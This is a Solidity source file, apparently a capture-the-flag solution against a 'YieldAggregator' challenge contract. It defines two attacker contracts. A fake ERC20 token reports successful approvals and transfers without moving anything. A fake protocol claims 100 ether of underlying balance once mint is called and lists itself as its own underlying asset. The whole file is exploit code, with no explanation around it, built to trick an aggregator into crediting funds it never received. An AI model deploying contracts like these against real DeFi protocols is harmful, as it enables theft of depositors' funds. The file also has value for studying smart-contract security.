pragma solidity 0.8.0;

import "../yield_aggregator/YieldAggregator.sol";

contract ExploitToken is ERC20Like {
    function approve(address, uint256) external override returns (bool) {
        return true;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external override returns (bool) {
        return true;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return 0;
    }

    function transfer(address dst, uint256 qty)
        external
        override
        returns (bool)
    {
        return true;
    }
}

contract ExploitProtocol is Protocol {
    bool minted;

    function mint(uint256 amount) external override {
        minted = true;
    }

    function balanceUnderlying() external view override returns (uint256) {
        if (minted) {
            return 100 ether;
        } else {
            return 0;
        }
    }

    function burn(uint256 amount) external override {}

    function underlying() external view override returns (ERC20Like) {
        return ERC20Like(address(this));
    }

    function rate() external view override returns (uint256) {
        return 1;
    }
}
